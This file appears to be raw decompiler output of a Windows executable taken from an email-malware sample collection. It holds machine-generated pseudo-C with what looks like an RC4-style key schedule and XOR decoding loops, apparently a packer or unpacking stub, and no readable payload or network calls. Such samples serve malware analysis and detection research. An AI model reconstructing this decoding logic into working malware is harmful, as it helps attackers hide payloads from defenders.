// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0670/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401005(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 esi, word32 edi, selector fs)
{
	word32 edx_16 = edx - ebx;
	word32 edx_27 = edx_16 - ebx - (edx_16 <u 0x00000000);
	word32 edx_45 = edx_27 - ebx - (edx_27 <u 0x00000000) - ebx;
	word32 eax_56 = DPB(edx_45, edx_45, 0, 16);
	word32 eax_77 = DPB(edx_45, eax_56, 0, 16);
	word32 eax_90 = DPB(eax_77 + 0xBDD92393, eax_77 + 0xBDD92393, 0, 16);
	word32 ecx_98;
	word32 ebx_99;
	word32 ebp_100;
	word32 edi_101;
	word32 eax_102 = fn004010D0(eax_90, 0x00000000, ebx, ebp, edi, fs, dwLoc2C, 0x00000000, esi, out ecx_98, out ebx_99, out ebp_100, out edi_101);
	word32 eax_105 = DPB(eax_102, eax_102, 0, 16);
	word32 ecx_108;
	word32 ebx_109;
	word32 ebp_110;
	word32 edi_111;
	fn004010D0(eax_105, ecx_98, ebx_99, ebp_100, edi_101, fs, ebp, dwArg14, dwArg20, out ecx_108, out ebx_109, out ebp_110, out edi_111);
	return;
}

word32 fn004010D0(word32 eax, word32 ecx, word32 ebx, word32 ebp, word32 edi, selector fs, word32 dwArg00, word32 dwArg18, word32 dwArg24, ptr32 ecxOut, ptr32 ebxOut, ptr32 ebpOut, ptr32 ediOut)
{
	word32 eax_21 = DPB(dwArg00, 0x0000, 0, 16);
	word32 ecx_27 = DPB(ecx, Mem0[eax_21 + 0x00000000:word16], 0, 16);
	word32 eax_37 = DPB(dwArg00, 0x0000, 0, 16);
	word32 ecx_49 = -(ecx_27 + 0x0000A5B2);
	word16 si_85 = (word16) (ecx_49 + edi + 0x00000001);
	Mem105[fp - 0x0000002C:word32] = fp - 0x00000028;
	word32 ecx_107;
	word32 ebx_108;
	word32 esi_110;
	word32 edi_111;
	word32 ebp_109;
	word32 eax_112 = fn0040168E(ebx, dwLoc30, out ecx_107, out ebx_108, out ebp_109, out esi_110, out edi_111);
	Mem116[fp - 0x00000018:word32] = edi_111;
	Mem118[fp - 0x0000001C:word32] = eax_112;
	word32 eax_123 = DPB(eax_112, eax_112, 0, 16);
	Mem118[ebx_108 + 0x00000018:word32]();
	word32 eax_135 = DPB(eax_112, eax_123, 0, 16);
	Mem118[ebx_108 + 0x0000001C:word32]();
	word32 eax_138 = DPB(eax_135 + 0x00000006, eax_135 + 0x00000006, 0, 16);
	word32 esi_141 = DPB(esi_110, si_85 + SEQ(fs, eax_138 - 0x00000002)[eax_138 * 0x0008], 0, 16);
	Mem147[fp - 0x00000020:word32] = eax_138;
	Mem149[fp - 0x00000024:word32] = eax_138;
	word32 eax_151 = DPB(eax_138, eax_138, 0, 16);
	Mem149[ebx_108 + 0x00000000:word32]();
	Mem152[fp + 0x00000014:word32] = ebx_108;
	Mem153[fp + 0x00000018:word32] = esi_141 - 0x00000001;
	Mem155[fp - 0x00000028:word32] = ebx_108;
	word32 v19_156 = Mem155[fp - 0x00000028:word32] - 0x00000004;
	Mem157[fp - 0x00000028:word32] = v19_156;
	word32 eax_160 = DPB(eax_138, eax_151, 0, 16);
	word32 edi_164 = Mem157[fp - 0x00000028:word32];
	Mem167[fp - 0x00000028:word32] = eax_160;
	Mem169[fp - 0x0000002C:word32] = ecx_107;
	Mem174[fp - 0x00000030:word32] = fp - 0x00000030;
	word32 eax_171 = DPB(eax_138, eax_160, 0, 16);
	Mem176[fp - 0x00000034:word32] = 0x00000040;
	Mem178[fp - 0x00000038:word32] = Mem176[fp - 0x00000008:word32];
	Mem180[fp - 0x0000003C:word32] = Mem178[fp - 0x00000014:word32];
	Mem182[fp - 0x0000000C:word32] = 0x00000000;
	word32 eax_185 = DPB(eax_138, eax_171, 0, 16);
	Mem182[edi_164 + 0x00000010:word32]();
	word32 eax_186 = eax_185 + Mem182[fs:eax_185 + 0x0000002F:word32];
	word32 eax_189 = DPB(eax_186, eax_186, 0, 16);
	word32 ecx_191 = Mem182[eax_189 + 0x00000003:word32];
	word32 v20_193 = Mem182[fp - 0x0000000C:word32] + ecx_191;
	Mem194[fp - 0x0000000C:word32] = v20_193;
	Mem199[fp - 0x0000003C:word32] = eax_189;
	Mem205[fp - 0x00000038:word32] = Mem199[fp - 0x0000003C:word32];
	word32 edi_208 = Mem205[fp - 0x00000034:word32];
	Mem211[fp - 0x00000034:word32] = Mem205[fp - 0x00000038:word32];
	word32 ebx_214 = Mem211[fp - 0x00000030:word32];
	Mem219[fp - 0x00000030:word32] = Mem211[fp - 0x00000034:word32];
	word16 bx_216 = (word16) ebx_214;
	word32 eax_221 = Mem219[fp - 0x00000030:word32];
	word32 esi_225 = Mem219[fp - 0x0000002C:word32];
	Mem233[fp - 0x0000002C:word32] = eax_221 + 0x00000003;
	word32 eax_234 = Mem233[fp - 0x0000002C:word32];
	word32 ecx_236 = Mem233[eax_234 + 0x00000000:word32];
	Mem238[fp - 0x0000002C:word32] = eax_234;
	word32 eax_239 = Mem238[fp - 0x0000002C:word32];
	word32 v21_241 = Mem238[fp + 0x00000000:word32] ^ ecx_236;
	Mem242[fp + 0x00000000:word32] = v21_241;
	Mem246[fp - 0x0000002C:word32] = eax_239;
	Mem251[fp - 0x0000002C:word32] = Mem246[fp - 0x00000020:word32];
	word32 ecx_257 = Mem251[fp - 0x00000010:word32];
	word32 eax_253 = Mem251[fp - 0x0000002C:word32];
	word16 cx_258 = (word16) ecx_257;
	Mem261[fp - 0x00000130:word32] = eax_253;
	Mem263[fp - 0x00000134:word32] = eax_253;
	word32 eax_264 = Mem263[fp - 0x00000134:word32];
	Mem266[fp - 0x0000012C:word32] = ecx_257;
	Mem268[fp - 0x00000134:word32] = eax_264;
	Mem273[fp - 0x00000134:word32] = edi_208;
	word32 esp_272 = fp - 0x00000134 + 0x0000000C;
	word32 eax_274 = 0x00000000;
	do
	{
		word32 esp_282 = esp_272 - 0x00000004;
		Mem283[esp_282 + 0x00000000:word32] = eax_274;
		word32 eax_284 = Mem283[esp_282 + 0x00000000:word32];
		Mem287[esp_272 + 0x00000000 + eax_274:byte] = (byte) eax_284;
		Mem290[esp_282 + 0x00000000:word32] = eax_284;
		Mem295[esp_282 + 0x00000000:word32] = Mem290[esp_282 + 0x00000000:word32] + 0x00000001;
		word32 eax_296 = Mem295[esp_282 + 0x00000000:word32];
		Mem301[esp_282 + 0x00000000:word32] = eax_296;
		eax_274 = Mem301[esp_282 + 0x00000000:word32];
		esp_272 = esp_282 + 0x00000004;
	} while (eax_296 <u 0x00000100);
	Mem308[esp_282 + 0x00000000:word32] = eax_274;
	word32 edi_311 = Mem308[esp_282 + 0x00000004:word32];
	Mem314[esp_282 + 0x00000004:word32] = Mem308[esp_282 + 0x00000000:word32];
	Mem319[esp_282 + 0x00000004:word32] = esp_282 + 0x00000140;
	word32 eax_320 = Mem319[esp_282 + 0x00000004:word32];
	Mem325[esp_282 + 0x00000004:word32] = eax_320;
	word32 eax_327 = Mem325[esp_282 + 0x00000004:word32];
	word32 esp_330 = esp_282 + 0x00000008;
	if (Mem319[eax_320 + 0x00000000:byte] != 0x79)
	{
		edi_311 = Mem325[eax_327 - 0x00000004:word32];
		do
		{
			Mem325[edi_311 + 0x00000018:word32]();
			Mem325[edi_311 + 0x00000018:word32]();
			Mem556[esp_282 + 0x00000004:word32] = eax_327;
			word32 eax_558 = Mem556[esp_282 + 0x00000004:word32];
			Mem556[edi_311 + 0x00000018:word32]();
			Mem561[esp_282 + 0x00000004:word32] = eax_558;
			word32 eax_563 = Mem561[esp_282 + 0x00000004:word32];
			Mem561[edi_311 + 0x00000018:word32]();
			Mem566[esp_282 + 0x00000004:word32] = eax_563;
			word32 eax_568 = Mem566[esp_282 + 0x00000004:word32];
			Mem566[edi_311 + 0x00000018:word32]();
			Mem571[esp_282 + 0x00000004:word32] = eax_568;
			word32 eax_573 = Mem571[esp_282 + 0x00000004:word32];
			Mem571[edi_311 + 0x00000018:word32]();
			Mem576[esp_282 + 0x00000004:word32] = eax_573;
			word32 eax_578 = Mem576[esp_282 + 0x00000004:word32];
			Mem576[edi_311 + 0x00000018:word32]();
			Mem581[esp_282 + 0x00000004:word32] = eax_578;
			word32 eax_583 = Mem581[esp_282 + 0x00000004:word32];
			Mem581[edi_311 + 0x00000010:word32]();
			Mem586[esp_282 + 0x00000004:word32] = eax_583;
			word32 eax_588 = Mem586[esp_282 + 0x00000004:word32];
			esp_330 = esp_282 + 0x00000008;
			word16 ax_597 = (word16) (eax_588 + 0x00000001);
			word16 ax_600 = ax_597 - cx_258;
			eax_327 = DPB(eax_588 + 0x00000001, ax_600, 0, 16);
		} while (ax_600 <u 0x0000);
	}
	word32 esp_354 = esp_330 - 0x00000004;
	Mem355[esp_354 + 0x00000000:word32] = ebp_109;
	Mem357[esp_354 - 0x00000004:word32] = esi_225;
	Mem359[esp_354 - 0x00000008:word32] = eax_327;
	word32 eax_360 = Mem359[esp_354 - 0x00000008:word32];
	Mem363[esp_354 - 0x00000008:word32] = edi_311;
	Mem365[esp_354 - 0x0000000C:word32] = eax_360;
	Mem370[esp_354 - 0x0000000C:word32] = Mem365[esp_354 - 0x0000000C:word32];
	word32 edi_374 = Mem370[esp_354 + 0x0000011C:word32];
	Mem383[esp_354 - 0x0000000C:word32] = 0x00000000;
	Mem390[esp_354 - 0x0000000C:word32] = Mem383[esp_354 - 0x0000000C:word32];
	word32 eax_391 = Mem390[esp_354 - 0x0000000C:word32];
	Mem394[esp_354 - 0x0000000C:word32] = ebx_214;
	Mem396[esp_354 - 0x00000010:word32] = eax_391;
	word32 esi_380 = 0x00000000;
	word32 ebp_386 = 0x00000000;
	word32 eax_398 = Mem396[esp_354 - 0x00000010:word32];
	word32 esp_401 = esp_354 - 0x0000000C + 0x00000018;
	do
	{
		word32 ebx_412 = (word32) Mem396[esp_401 + 0x00000000 + ebp_386:byte];
		word32 esp_413 = esp_401 - 0x00000004;
		Mem414[esp_413 + 0x00000000:word32] = eax_398;
		word32 edx_417 = Mem414[esp_413 + 0x00000018:word32];
		Mem419[esp_413 + 0x00000000:word32] = Mem414[esp_413 + 0x00000000:word32];
		word32 eax_420 = Mem419[esp_413 + 0x00000000:word32];
		word32 edx_422 = (word32) Mem419[edx_417 + eax_420:byte];
		Mem424[esp_413 + 0x00000000:word32] = eax_420;
		Mem429[esp_413 + 0x00000000:word32] = Mem424[esp_413 + 0x00000000:word32];
		Mem434[esp_413 + 0x00000000:word32] = Mem429[esp_413 + 0x00000000:word32];
		word32 eax_436 = Mem434[esp_413 + 0x00000000:word32];
		word32 edx_440 = edx_422 + (ebx_412 + esi_380);
		word32 edx_445 = DPB(edx_440, 0x00, 8, 8);
		esi_380 = edx_445;
		Mem457[esp_413 + 0x00000000:word32] = eax_436 + 0x00000001;
		word32 eax_459 = Mem457[esp_413 + 0x00000000:word32];
		word32 esp_462 = esp_413 + 0x00000004;
		if (eax_436 + 0x00000001 >=u edi_374)
		{
			Mem541[esp_413 + 0x00000000:word32] = eax_459;
			Mem548[esp_413 + 0x00000000:word32] = 0x00000000;
			eax_459 = Mem548[esp_413 + 0x00000000:word32];
			esp_462 = esp_413 + 0x00000004;
		}
		byte dl_466 = Mem457[esp_462 + 0x00000018 + edx_445:byte];
		word32 esp_467 = esp_462 - 0x00000004;
		Mem468[esp_467 + 0x00000000:word32] = eax_459;
		word32 eax_469 = Mem468[esp_467 + 0x00000000:word32];
		Mem471[esp_467 + 0x0000001C + ebp_386:byte] = dl_466;
		Mem473[esp_467 + 0x00000000:word32] = eax_469;
		word32 eax_475 = Mem473[esp_467 + 0x00000000:word32];
		ebp_386 = ebp_386 + 0x00000001;
		word32 edx_481 = esp_467 + 0x0000001C + edx_445;
		word32 edx_484 = edx_481 - eax_475;
		bx_216 = DPB(bx_216, Mem473[eax_475 + 0x00000001 + edx_484:byte], 8, 8);
		Mem491[esp_467 + 0x00000000:word32] = eax_475;
		word32 eax_492 = Mem491[esp_467 + 0x00000000:word32];
		Mem494[eax_492 + edx_484:word16] = bx_216;
		Mem496[esp_467 + 0x00000000:word32] = eax_492;
		Mem502[esp_467 + 0x00000000:word32] = Mem496[esp_467 + 0x00000000:word32];
		Mem509[esp_467 + 0x00000000:word32] = Mem502[esp_467 + 0x00000000:word32];
		Mem514[esp_467 + 0x00000000:word32] = Mem509[esp_467 + 0x00000000:word32];
		eax_398 = Mem514[esp_467 + 0x00000000:word32];
		esp_401 = esp_467 + 0x00000004;
	} while (SLICE(ebp_386, byte, 8) != 0x01);
	word32 ecx_528;
	word32 ebx_529;
	word32 ebp_530;
	word32 esi_531;
	word32 edi_532;
	return fn004016CA(eax_37 + 0x00006C79, eax_37 + 0x00006030, dwArg04, dwArg08, dwArg0C, dwArg0114, dwArg0118, dwArg0128, dwArg013C, dwArg0140, out ecx_528, out ebx_529, out ebp_530, out esi_531, out edi_532);
}

word32 fn0040168E(word32 ebx, word32 dwArg00, ptr32 ecxOut, ptr32 ebxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
	word32 ecx_28;
	word32 ebx_29;
	word32 ebp_30;
	word32 esi_31;
	word32 edi_32;
	return fn004016CA(dwArg00, ebx, dwArg00, dwArg00, dwArg04, dwArg010C, dwArg0110, dwArg0120, dwArg0134, dwArg0138, out ecx_28, out ebx_29, out ebp_30, out esi_31, out edi_32);
}

word32 fn004016CA(word32 dwArg00, word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg0118, word32 dwArg011C, word32 dwArg012C, word32 dwArg0140, word32 dwArg0144, ptr32 ecxOut, ptr32 ebxOut, ptr32 ebpOut, ptr32 esiOut, ptr32 ediOut)
{
	esp = fp;
	esi = 0x00000000;
	SZO = cond(0x00000000);
	C = false;
	eax = 0x00000000;
	SZO = cond(0x00000000);
	C = false;
	esp = fp - 0x00000004;
	dwLoc04 = 0x00000000;
	ax = 0x00000000;
	eax = dwLoc04;
	esp = fp;
	ebx = dwArg00;
	bl = (byte) ebx;
	bh = SLICE(ebx, byte, 8);
	esp = fp + 0x00000004;
	ebp = dwArg012C;
	edi = dwArg10;
	esp = fp;
	dwArg00 = 0x00000000;
	eax = dwArg00;
	esp = fp + 0x00000004;
	edx = ebx;
	dl = (byte) edx;
	esp = fp;
	dwArg00 = eax;
	ax = eax;
	eax = dwArg00;
	ax = (word16) eax;
	ah = SLICE(eax, byte, 8);
	al = (byte) eax;
	esp = fp + 0x00000004;
	SZO = cond(ebp & ebp);
	Z = SZO;
	C = false;
	CZ = C;
	SCZO = C;
	if (Test(UGT,CZ))
	{
		do
		{
			eax = eax + 0x00000001;
			esp = fp;
			dwArg00 = eax;
			ax = eax;
			eax = dwArg00;
			al = (byte) eax;
			esp = fp + 0x00000004;
			ah = 0x00;
			eax = DPB(eax, ah, 8, 8);
			ax = DPB(ax, ah, 8, 8);
			SCZO = cond(0x00);
			cl = Mem0[fp + 0x00000018 + eax:byte];
			ecx = DPB(ecx, cl, 0, 8);
			cx = DPB(cx, cl, 0, 8);
			ebx = 0x00000000;
			bh = SLICE(ebx, byte, 8);
			SZO = cond(0x00000000);
			C = false;
			esp = fp;
			dwArg00 = eax;
			ax = eax;
			eax = dwArg00;
			ax = (word16) eax;
			ah = SLICE(eax, byte, 8);
			al = (byte) eax;
			esp = fp + 0x00000004;
			bl = cl;
			ebx = DPB(ebx, bl, 0, 8);
			ebx = ebx + esi;
			bl = (byte) ebx;
			bh = SLICE(ebx, byte, 8);
			SCZO = cond(ebx);
			bh = 0x00;
			ebx = DPB(ebx, bh, 8, 8);
			SZO = cond(0x00);
			C = false;
			esi = ebx + 0x00000014;
			dl = Mem0[fp + 0x00000004 + esi:byte];
			edx = DPB(edx, dl, 0, 8);
			Mem0[fp + 0x00000018 + eax:byte] = dl;
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			esp = fp;
			dwArg00 = eax;
			esp = fp - 0x00000004;
			dwLoc04 = eax;
			eax = dwLoc04;
			esp = fp;
			eax = fp + 0x00000004 + esi;
			esp = fp - 0x00000004;
			dwLoc04 = eax;
			eax = dwLoc04;
			esp = fp;
			Mem0[eax + 0x00000000:byte] = cl;
			esp = fp - 0x00000004;
			dwLoc04 = eax;
			eax = dwLoc04;
			esp = fp;
			eax = dwArg00;
			esp = fp + 0x00000004;
			esp = fp;
			dwArg00 = eax;
			ax = eax;
			eax = dwArg00;
			ax = (word16) eax;
			ah = SLICE(eax, byte, 8);
			al = (byte) eax;
			esp = fp + 0x00000004;
			edx = (word32) dl;
			dl = (byte) edx;
			dl = dl + cl;
			edx = DPB(edx, dl, 0, 8);
			SCZO = cond(dl);
			edx = edx + 0x00000014;
			dl = (byte) edx;
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			ecx = Mem0[fp + 0x00000004 + edx:word32];
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			ecx = ecx << 0x00000008;
			cl = (byte) ecx;
			cx = (word16) ecx;
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			esi = esi + 0xFFFFFFEC;
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			v21 = Mem0[edi - 0x00000001:word16] ^ cx;
			Mem0[edi - 0x00000001:word16] = v21;
			SZO = cond(Mem0[edi - 0x00000001:word16]);
			C = false;
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			edi = edi + 0x00000001;
			esp = fp;
			dwArg00 = eax;
			eax = dwArg00;
			esp = fp + 0x00000004;
			ebp = ebp - 0x00000001;
			SZO = cond(ebp);
			Z = SZO;
			esp = fp;
			dwArg00 = eax;
			ax = eax;
			eax = dwArg00;
			ax = (word16) eax;
			ah = SLICE(eax, byte, 8);
			al = (byte) eax;
			esp = fp + 0x00000004;
		} while (Test(NE,Z));
		esp = fp;
		dwArg00 = eax;
		ax = eax;
		eax = dwArg00;
		esp = fp + 0x00000004;
	}
	edi = dwArg04;
	esp = fp + 0x00000008;
	esi = dwArg08;
	esp = fp + 0x0000000C;
	ebp = dwArg0C;
	esp = fp + 0x00000010;
	esp = fp + 0x0000000C;
	dwArg0C = eax;
	eax = dwArg0C;
	esp = fp + 0x00000010;
	esp = fp + 0x0000011C;
	esp = fp + 0x00000118;
	dwArg0118 = eax;
	eax = dwArg0118;
	esp = fp + 0x0000011C;
	eax = dwArg011C;
	esp = fp + 0x00000120;
	esp = fp + 0x0000011C;
	dwArg011C = eax;
	eax = dwArg011C;
	esp = fp + 0x00000120;
	esp = fp + 0x00000148;
	SCZO = cond(fp + 0x00000148);
	esp = fp + 0x00000144;
	dwArg0144 = eax;
	eax = dwArg0144;
	esp = fp + 0x00000148;
	esp = fp + 0x00000144;
	dwArg0144 = eax;
	esp = fp + 0x00000140;
	dwArg0140 = eax;
	eax = dwArg0140;
	esp = fp + 0x00000144;
	ebx = edx;
	bl = (byte) ebx;
	bh = SLICE(ebx, byte, 8);
	esp = fp + 0x00000140;
	dwArg0140 = eax;
	ax = eax;
	eax = dwArg0140;
	ax = (word16) eax;
	ah = SLICE(eax, byte, 8);
	al = (byte) eax;
	esp = fp + 0x00000144;
	return eax;
}

